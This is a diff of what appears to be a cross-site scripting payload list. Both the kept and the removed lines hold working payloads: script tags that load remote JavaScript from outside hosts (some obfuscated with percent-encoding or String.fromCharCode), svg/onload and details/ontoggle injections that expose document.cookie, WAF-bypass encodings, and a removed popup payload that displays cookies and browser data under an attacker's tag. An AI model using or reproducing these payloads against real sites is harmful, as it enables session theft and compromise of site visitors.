@@ -7,11 +7,7 @@ leet"<<xxx>img%20src%3dx%20onerror%3dalert('Bypassed!')>
 "></title><script src="%68%74%74%70%73%3a%2f%2f%74%72%6b%6e%61%69%74%6f%6f%6c%73%2e%72%65%70%6c%69%74%2e%61%70%70%2f%70%6f%70%78%6f%62%2e%6a%73"></script>
 "><script>alert(String.fromCharCode(116, 114, 104, 97, 99, 107, 110, 111, 110));</script>
 "><script>alert(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61));</script>
-<script src="https://trknaitools.replit.app/popxob.js"></script>
-<script src="https://trknaitools.replit.app/popp.js"></script>
-%22%3e%3cscript%20src%3d%22https%3a%2f%2ftrknaitools%2ereplit%2eapp%2fpopxob%2ejs%22%3e%3c%2fscript%3e
-<script src="https://trknaitools.replit.app/pop.js"></script>
-<svg/onload="var popup = document.createElement('div'); popup.innerHTML = '<div style=\'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; background-color: #000; border: 2px solid #ff0000; z-index: 9999; text-align: center; width: 300px; color: #fff;\'> <img src=\'https://trknaitools.replit.app/trkn.svg\' alt=\'Logo\' width=\'100\' height=\'100\'> <p style=\'color: #ff0000;\'><strong>XSS_BY <span style=\'color: #f00;\'>T</span><span style=\'color: #0f0;\'>r</span><span style=\'color: #00f;\'>h</span><span style=\'color: #ff0;\'>a</span><span style=\'color: #f0f;\'>c</span><span style=\'color: #0ff;\'>k</span><span style=\'color: #000;\'>n</span><span style=\'color: #0ff;\'>o</span><span style=\'color: #f0f;\'>n</span></strong></p> <p>✓COOKIE ' + document.cookie + '</p> <p>✓DOMAIN ' + document.domain + '</p> <p>✓TITRE ' + document.title + '</p> <p>✓UserAgent ' + navigator.userAgent + '</p> <p>✓AppVersion ' + navigator.appVersion + '</p> <p>✓PLATFORM ' + navigator.platform + '</p> <p>✓AppCode ' + navigator.appCodeName + '</p> <p>✓AppName ' + navigator.appName + '</p> <p>✓CookieEnabled ' + navigator.cookieEnabled + '</p> <p>✓LANGUAGE ' + navigator.language + '</p> <p>✓Online ' + navigator.onLine + '</p> <button onclick=\'document.body.removeChild(popup);\'>Fermer Popup</button></div>'; document.body.appendChild(popup);">
+
 "><svg/onload="confirm(`xss`)">
 `><svg/onload="prompt(`xss`,document.cookie)">
 "><svg/onload='prompt(`xss`,document.cookie)'>
@@ -20,8 +16,6 @@ leet"<<xxx>img%20src%3dx%20onerror%3dalert('Bypassed!')>
 '%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
 ><%2fSCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT>
 "><details/open/id="&XSS"ontoggle=alert("XSS_WAF_TRKN_:-)")>
-<script src="https://static-trkn.replit.app/recatchx.js"></script>
-<script src="https://vmi850151.contaboserver.net/js/wel.js"></script>
 %22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/trkn%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2ftrkn%F0%9F%98%88%2f%29%3C%21--
 "<!--><Svg OnLoad=confirm?.(/trkn%F0%9F%98%88/)<!--1"%29"<%21--><Svg+OnLoad%3Dconfirm%3f%2e%28%2ftrkn%F0%9F%98%88%2f%29<%21--
 javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
